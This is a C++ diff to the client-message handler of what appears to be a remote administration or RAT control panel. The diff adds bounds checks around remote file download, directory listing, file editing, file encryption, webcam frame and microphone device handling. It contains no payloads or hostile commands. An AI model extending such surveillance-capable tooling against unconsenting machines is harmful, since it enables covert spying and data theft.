@@ -105,21 +105,24 @@ void Cliente_Handler::Spawn_Handler(){
         //Prioridad para descarga de archivos
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
-            // CMD + 2 slashs /  +len del id
-            int iHeader = 5 + vcDatos[1].size();
-            int iBytesSize = iRecibido - iHeader;
-            char* cBytes = cBuffer + iHeader;
-            
-            FILE* fp = this->um_Archivos_Descarga[vcDatos[1]].iFP;
-            if (fp) {
-                fwrite(cBytes, sizeof(char), iBytesSize, fp);
-                //Por los momentos solo es necesario que el servidor almacene el progreso
-                //this->um_Archivos_Descarga[vcDatos[1]].uDescargado += iBytesSize;
+            if (vcDatos.size() == 2) {
+                // CMD + 2 slashs /  +len del id
+                int iHeader = 5 + vcDatos[1].size();
+                int iBytesSize = iRecibido - iHeader;
+                char* cBytes = cBuffer + iHeader;
 
-                std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
-                p_Servidor->vcTransferencias[vcDatos[1]].uDescargado += iBytesSize;
-            }else {
-                this->Log("El archivo no esta abierto");
+                FILE* fp = this->um_Archivos_Descarga[vcDatos[1]].iFP;
+                if (fp) {
+                    fwrite(cBytes, sizeof(char), iBytesSize, fp);
+                    //Por los momentos solo es necesario que el servidor almacene el progreso
+                    //this->um_Archivos_Descarga[vcDatos[1]].uDescargado += iBytesSize;
+
+                    std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
+                    p_Servidor->vcTransferencias[vcDatos[1]].uDescargado += iBytesSize;
+                }
+                else {
+                    this->Log("El archivo no esta abierto");
+                }
             }
             continue;
         }
@@ -161,40 +164,42 @@ void Cliente_Handler::Spawn_Handler(){
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
-            std::vector<std::string> vcFileEntry;
-            wxString strTama = "-";
-            if (vcDatos[1][1] == '>') {
-                //Dir
-                vcFileEntry = strSplit(vcDatos[1], '>', 4);
-            }
-            else if (vcDatos[1][1] == '<') {
-                //file
-                vcFileEntry = strSplit(vcDatos[1], '<', 4);
-                if (vcFileEntry.size() == 4) {
-                    u64 bytes = StrToUint(vcFileEntry[2].c_str());
-                    char* cDEN = "BKMGTP";
-                    double factor = floor((vcFileEntry[2].size() - 1) / 3);
-                    char cBuf[20];
-                    snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
-                    strTama = cBuf;
+            if (vcDatos.size() == 2) {
+                std::vector<std::string> vcFileEntry;
+                wxString strTama = "-";
+                if (vcDatos[1][1] == '>') {
+                    //Dir
+                    vcFileEntry = strSplit(vcDatos[1], '>', 4);
                 }
-            }
-            else {
-                //unknown
-                std::cout << "DESCONOCIDO: " << cBuffer << std::endl;
-            }
+                else if (vcDatos[1][1] == '<') {
+                    //file
+                    vcFileEntry = strSplit(vcDatos[1], '<', 4);
+                    if (vcFileEntry.size() == 4) {
+                        u64 bytes = StrToUint(vcFileEntry[2].c_str());
+                        char* cDEN = "BKMGTP";
+                        double factor = floor((vcFileEntry[2].size() - 1) / 3);
+                        char cBuf[20];
+                        snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
+                        strTama = cBuf;
+                    }
+                }
+                else {
+                    //unknown
+                    std::cout << "DESCONOCIDO: " << cBuffer << std::endl;
+                }
 
-            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
-            if (temp_list) {
-                if (vcFileEntry.size() >= 4) {
-                    int iCount = temp_list->GetItemCount() > 0 ? temp_list->GetItemCount() - 1 : 0;
-                    temp_list->InsertItem(iCount, wxString("-"));
-                    temp_list->SetItem(iCount, 1, wxString(vcFileEntry[1]));
-                    temp_list->SetItem(iCount, 2, strTama); //tama
-                    temp_list->SetItem(iCount, 3, wxString(vcFileEntry[3]));
+                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
+                if (temp_list) {
+                    if (vcFileEntry.size() >= 4) {
+                        int iCount = temp_list->GetItemCount() > 0 ? temp_list->GetItemCount() - 1 : 0;
+                        temp_list->InsertItem(iCount, wxString("-"));
+                        temp_list->SetItem(iCount, 1, wxString(vcFileEntry[1]));
+                        temp_list->SetItem(iCount, 2, strTama); //tama
+                        temp_list->SetItem(iCount, 3, wxString(vcFileEntry[3]));
+                    }
                 }
+
             }
-            
             continue;
         }
 
@@ -222,58 +227,70 @@ void Cliente_Handler::Spawn_Handler(){
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 3);
-            //Tama�o del archivo recibido
-            u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
+            if (vcDatos.size() == 3) {
+                //Tama�o del archivo recibido
+                u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
 
-            this->um_Archivos_Descarga[vcDatos[1]].uTamarchivo = uTamArchivo;
-            
-            std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
-            p_Servidor->vcTransferencias[vcDatos[1]].uTamano = uTamArchivo;
-            lock.unlock();
+                this->um_Archivos_Descarga[vcDatos[1]].uTamarchivo = uTamArchivo;
 
-            std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
+                std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
+                p_Servidor->vcTransferencias[vcDatos[1]].uTamano = uTamArchivo;
+                lock.unlock();
+
+                std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
+            }
             continue;
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
-            
-            if(this->um_Archivos_Descarga[vcDatos[1]].iFP){
-                fclose(this->um_Archivos_Descarga[vcDatos[1]].iFP);
-            }
+            if (vcDatos.size() == 2) {
+                if (this->um_Archivos_Descarga[vcDatos[1]].iFP) {
+                    fclose(this->um_Archivos_Descarga[vcDatos[1]].iFP);
+                }
 
-            this->Log("[!] Descarga completa");
+                this->Log("[!] Descarga completa");
+            }
             continue;
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Editar_Archivo_Paquete)) {
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
-            //Tama�o del id del comando, id del archivo y dos back slashes
-            int iHeadSize = 2 + vcDatos[0].size() + vcDatos[1].size();
-            char* cBytes = cBuffer + iHeadSize;
-    
-            wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[1], this->n_Frame);
-            if (temp_edit_form) {
-                temp_edit_form->p_txtEditor->AppendText(wxString(cBytes));
-                temp_edit_form->p_txtEditor->SetInsertionPoint(0);
-;            }else {
-                this->Log("No se pudo encontrar la ventana con id " + vcDatos[1]);
+            if (vcDatos.size() == 2) {
+                //Tama�o del id del comando, id del archivo y dos back slashes
+                int iHeadSize = 2 + vcDatos[0].size() + vcDatos[1].size();
+                char* cBytes = cBuffer + iHeadSize;
+
+                wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[1], this->n_Frame);
+                if (temp_edit_form) {
+                    temp_edit_form->p_txtEditor->AppendText(wxString(cBytes));
+                    temp_edit_form->p_txtEditor->SetInsertionPoint(0);
+                    ;
+                }
+                else {
+                    this->Log("No se pudo encontrar la ventana con id " + vcDatos[1]);
+                }
             }
+            continue;
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Crypt_Confirm)) {
             //Confirmacion de cifrado
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
-            wxString strMessage = "";
-            if (vcDatos[1] == "1") {
-                strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
-            }else if (vcDatos[1] == "2") {
-                strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
-            }else if (vcDatos[1] == "3") {
-                strMessage = "[CYRPT] Operacion completada";
-            }
+            if (vcDatos.size() == 2) {
+                wxString strMessage = "";
+                if (vcDatos[1] == "1") {
+                    strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
+                }
+                else if (vcDatos[1] == "2") {
+                    strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
+                }
+                else if (vcDatos[1] == "3") {
+                    strMessage = "[CYRPT] Operacion completada";
+                }
 
-            wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
+                wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
+            }
             continue;
         }
 
@@ -317,63 +334,73 @@ void Cliente_Handler::Spawn_Handler(){
 
         if (vcDatos[0] == std::to_string(EnumComandos::CM_Lista_Salida)) {
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
-            std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
-            wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
-            if (panel_cam_combo) {
-                wxArrayString arrCams;
-                for (std::string cCam : vcCams) {
-                    arrCams.push_back(cCam);
+            if (vcDatos.size() == 2) {
+                std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
+                if (vcCams.size() > 0) {
+                    wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
+                    if (panel_cam_combo) {
+                        wxArrayString arrCams;
+                        for (std::string cCam : vcCams) {
+                            arrCams.push_back(cCam);
+                        }
+                        panel_cam_combo->Clear();
+                        panel_cam_combo->Append(arrCams);
+                    }
                 }
-                panel_cam_combo->Clear();
-                panel_cam_combo->Append(arrCams);
             }
             continue;
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::CM_Single_Salida)){
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
-            //CMD DEL ID_DEV DEL BUFFER
-            this->Log(cBuffer);
-            int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 2) + vcDatos[1].size(); //CMD + len de dos delimitador + len del id del dev
-            int iBuffSize = iRecibido - iHeadSize;
-            char* cBytes = cBuffer + iHeadSize;
-            panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
-            if (panel_picture) {
-                if (panel_picture->iBufferSize > 0) {
-                    delete[] panel_picture->cPictureBuffer;
-                } 
-                panel_picture->cPictureBuffer = new char[iBuffSize];
-                if (panel_picture->cPictureBuffer) {
-                    memcpy(panel_picture->cPictureBuffer, cBytes, iBuffSize);
-                    panel_picture->iBufferSize = iBuffSize;
-                    panel_picture->OnDrawBuffer();
-                } else {
-                    this->Log("[X][MOD-CAM] No se pudo allocar memoria para copiar los bytes");
-                }
+            if (vcDatos.size() == 2) {
+                //CMD DEL ID_DEV DEL BUFFER
+                this->Log(cBuffer);
+                int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 2) + vcDatos[1].size(); //CMD + len de dos delimitador + len del id del dev
+                int iBuffSize = iRecibido - iHeadSize;
+                char* cBytes = cBuffer + iHeadSize;
+                panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
+                if (panel_picture) {
+                    if (panel_picture->iBufferSize > 0) {
+                        delete[] panel_picture->cPictureBuffer;
+                    }
+                    panel_picture->cPictureBuffer = new char[iBuffSize];
+                    if (panel_picture->cPictureBuffer) {
+                        memcpy(panel_picture->cPictureBuffer, cBytes, iBuffSize);
+                        panel_picture->iBufferSize = iBuffSize;
+                        panel_picture->OnDrawBuffer();
+                    }
+                    else {
+                        this->Log("[X][MOD-CAM] No se pudo allocar memoria para copiar los bytes");
+                    }
 
-            }else {
-                this->Log("[X] No se pudo encontrar el panel de camara");
+                }
+                else {
+                    this->Log("[X] No se pudo encontrar el panel de camara");
+                }
             }
             continue;
 ;        }
 
         if (vcDatos[0] == std::to_string(EnumComandos::Mic_Refre_Resultado)) {
             vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 15);
-            
-            wxArrayString cli_devices;
-            for (int i = 1; i<int(vcDatos.size()); i++) {
-                cli_devices.push_back(vcDatos[i]);
-            }
-
-            panelMicrophone* temp_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, this->n_Frame);
-            if (temp_panel) {
-                wxComboBox* temp_combo_box = (wxComboBox*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Mic_CMB_Devices, temp_panel);
-                if (temp_combo_box) {
-                    temp_combo_box->Clear();
-                    temp_combo_box->Append(cli_devices);
+            if (vcDatos.size() > 0) {
+                wxArrayString cli_devices;
+                for (int i = 1; i<int(vcDatos.size()); i++) {
+                    cli_devices.push_back(vcDatos[i]);
                 }
-            }else {
-                std::cout << "No se pudo encontrar ventana activa\n";
+
+                panelMicrophone* temp_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, this->n_Frame);
+                if (temp_panel) {
+                    wxComboBox* temp_combo_box = (wxComboBox*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Mic_CMB_Devices, temp_panel);
+                    if (temp_combo_box) {
+                        temp_combo_box->Clear();
+                        temp_combo_box->Append(cli_devices);
+                    }
+                }
+                else {
+                    std::cout << "No se pudo encontrar ventana activa\n";
+                }
             }
             continue;
         }
